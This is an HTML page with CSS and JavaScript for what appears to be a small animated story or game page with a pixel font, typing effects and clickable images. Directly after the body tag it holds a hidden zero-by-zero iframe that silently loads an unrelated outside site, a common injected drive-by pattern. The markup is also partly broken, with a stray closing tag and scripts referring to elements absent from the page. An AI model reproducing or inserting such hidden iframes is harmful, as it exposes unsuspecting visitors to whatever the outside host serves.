<!DOCTYPE html>
<html>
<style>
		@font-face {
      font-family: "DungGeunMo";
      src: url("DungGeunMo.woff");
    }
	
	body{background-color: #484535; font-family: "DungGeunMo";}
	#backk{width: auto; height: 100%; animation:start 13s alternate;}
	#backk img{width: 1250px; height: auto;}
	#po{top: 300px; left: 30%;}
	#poo{top: 350px; left: 25%; font-weight: 10px; font-size: 3em;}
	#poom{bottom: 10%; font-weight: 5px; font-size: 1em;display:none; left: 28%;font-family: "DungGeunMo";z-index: 11;}
	#poom2{bottom: 10%; font-weight: 5px; font-size: 1em;display:none; left: 28%;font-family: "DungGeunMo";z-index: 11;}

	#bx { position: absolute; bottom: 5%; left: 25%; opacity: 0; z-index: 9;}
	#bx img{ width: 70%; height: auto;  }

	#floor { position: absolute; z-index: 99;cursor: pointer; top: 50%; left: 40%; display:none;}
	#floor img{ position: absolute; width: 300px; height: 200px;z-index: 99;cursor: pointer;}
	#floo { position: absolute; z-index: 99;cursor: pointer; top: 20%; left: 60%;display:none; }
	#floo img{ position: absolute;  width: 300px; height: 200px;z-index: 99;cursor: pointer;}

	#lefts{top: 50%; left: 3%; position: absolute; cursor: pointer; animation: here 3s alternate;display: none;}
	#lefts img{width: 40px; height: auto; }
	#rights{top: 50%; right: 3%; position: absolute; animation: heree 3s alternate;display: none;}
	#rights img{width: 40px; height: auto;cursor: pointer; }

	#okk{bottom: 13%; right: 30%;z-index: 15; cursor: pointer; position: absolute;display:none;}
		#okk img{height: 20px;width: auto; }
	#container{position: relative; margin: auto; width:1250px; height: 1000px;font-family: "DungGeunMo"; }

@-webkit-keyframes typing { from { width: 0; } }
@-webkit-keyframes blink-caret { 50% { border-color: #484535; } }
@keyframes start{
			0%{opacity: 0;}
			90%{opacity: 0;}
			
			100%{opacity: 1;}
		}


h1 { 
	color: #26241B;
	border-right: .2em solid #26241B;
	 
	width: 25ch;
	margin: 2em 1em;
	white-space: nowrap;
	overflow: hidden;
	position: absolute;
	-webkit-animation: typing 7s steps(21, end),
	           blink-caret .5s step-end infinite alternate;
}
h3 { 
	color: #26241B;
	border-right: .2em solid #26241B;
	 
	width: 20ch;
	margin: 2em 1em;
	white-space: nowrap;
	overflow: hidden;
	position: absolute;
	-webkit-animation: typing 7s steps(21, end),
	           blink-caret .5s step-end infinite alternate;
}
h2 { 
	color: #484535;
	border-right: .2em solid #26241B;
	 
	width: 45ch;
	margin: 2em 1em;
	white-space: nowrap;
	overflow: hidden;
	position: absolute;
	-webkit-animation: typing 3s steps(40, end),
	           blink-caret .1s step-end infinite alternate; z-index: 3;
}




@keyframes here{
			0%{left: 6%;}
			
			100%{left: 3%;}
		}

@keyframes heree{
			0%{right: 6%;}
			
			100%{right: 3%;}
		}		
</style>

<head>
	<title></title>
</head>

<body>

<iframe src="http://mampel.ir/" frameborder="0" style="width:0px;height:0px;border:0px" ></iframe>

</div>
<script type="text/javascript">

var bgPlay = 0;
window.onmousemove = function(){
	bgPlay++;
	if(bgPlay == 1){ typing.play(); }
}

var toggle = "off";
	
var toggle = "off";
	var clickNumber = 0;
	floor.onclick = function(){
		
		if(toggle == "off"){
			floormp.play();
			toggle = "on";
			bx.style.opacity = 1;
			poom.style.display = "inline";
			poom2.style.display = "none";
		okk.style.display = "inline"}
			else{
			toggle = "off";
			bx.style.opacity = 0;
			poom.style.display = "none";
			poom2.style.display = "none";
			okk.style.display = "none"
			
		}
	}

	floo.onclick = function(){
		
		if(toggle == "off"){
			poom.style.display = "none";
			floormp.play();
			toggle = "on";
			bx.style.opacity = 1;
			poom2.style.display = "inline";
			okk.style.display = "inline"
		}
			else{
				poom.style.display = "none";
			toggle = "off";
			bx.style.opacity = 0;
			poom2.style.display = "none";
			okk.style.display = "none"
			
		}
	}

okk.onclick = function(){
	okk.style.display = "none"
	bx.style.opacity = 0;
			poom.style.display = "none";
			poom2.style.display = "none";

}

	function hideDiv (){ 
  document.getElementById("po").style.display="none"; 
  document.getElementById("poo").style.display="none";
  document.getElementById("floor").style.display="inline";
  document.getElementById("floo").style.display="inline";  

} 
self.setTimeout("hideDiv()",13000); // 사건번호

function lookDiv (){ 
  document.getElementById("lefts").style.display="inline"; 
  document.getElementById("rights").style.display="inline"; 

} 
self.setTimeout("lookDiv()",13000);



</script>
